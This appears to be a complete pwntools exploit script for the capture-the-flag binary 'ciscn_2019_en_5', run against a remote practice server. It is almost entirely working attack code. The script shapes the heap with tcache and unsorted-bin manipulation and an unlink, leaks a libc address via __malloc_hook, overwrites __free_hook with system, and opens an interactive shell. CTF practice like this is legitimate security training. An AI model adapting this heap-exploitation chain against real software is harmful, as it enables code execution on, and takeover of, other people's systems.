# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_2019_en_5'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29923'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , text = 'a\n'):
    cmd(1)
    sla('length>' , size)
    sa('content>' , text)


def show(idx ):
    cmd(2)
    sla('index>' , idx)

def delete(idx ):
    cmd(3)
    sla('index>' , idx)

# $rebase(0x0000000000202100)

# one_gad = one_gadget(libc.path)

def attack():
    
    sa('name>' , '/bin/sh\x00')

    add(0xf8) #0
    add(0xf8) #1
    add(0xf8) #2
    add(0xf8) #3
    add(0xf8) #4
    add(0xf8) #5
    for i in range(7):
        add(0xf8)

    for i in range(7):
        delete(6+i)

    delete(0)
    delete(1)
    delete(2)

    add(0xf0)
    add(0x88)
    add(0x38)
    add(0x98)
    add(0x38)

    # 在 unsorted bin 处合并堆块

    for i in range(7):
        add(0x88)

    for i in range(7):
        delete(8 + i)
    
    delete(1)
    # unlink 前的准备工作

    delete(3)
    # unlink
    add(0x38)
    add(0x38)

    show(2)
    
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    delete(6)

    add(0x68 , flat('a'*0x50 , __free_hook ) )
    add(0x98 )
    add(0x98 , p64( system_addr ))

    cmd(4)
    sla('remarks> ' , 1)


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ciscn_2019_en_5.py
@Time    :   2022/02/17 13:36:43
@Author  :   Niyah 
'''